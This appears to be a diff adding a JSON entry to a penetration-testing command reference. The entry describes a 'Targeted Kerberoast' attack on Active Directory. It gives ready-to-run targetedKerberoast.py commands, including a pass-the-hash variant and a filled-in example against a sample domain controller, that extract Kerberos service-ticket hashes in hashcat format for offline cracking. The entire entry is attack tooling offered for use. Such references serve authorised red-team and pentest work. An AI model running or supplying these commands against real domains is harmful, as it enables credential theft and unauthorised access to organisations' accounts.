@@ -1,0 +1,29 @@
+{
+  "id": "targeted-kerberoast",
+  "name": "Targeted Kerberoast",
+  "command": "python targetedKerberoast.py -v --dc-ip '<ip>' -u '<user>' -p '<password>' -d '<domain>' -f hashcat -o targeted_kerberoasting.hash",
+  "description": "Targeted Kerberoasting attack on specific accounts",
+  "platform": "cross-platform",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "kerberoast",
+    "targeted",
+    "spn",
+    "hash"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "python targetedKerberoast.py -v --dc-ip '<ip>' -u '<user>' -H '<hash>' -d '<domain>' -f hashcat -o targeted_kerberoasting.hash"
+    }
+  ],
+  "examples": [
+    "python targetedKerberoast.py -v --dc-ip '192.168.1.100' -u 'user' -p 'password' -d 'CORP.LOCAL' -f hashcat -o targeted_kerberoasting.hash"
+  ]
+}
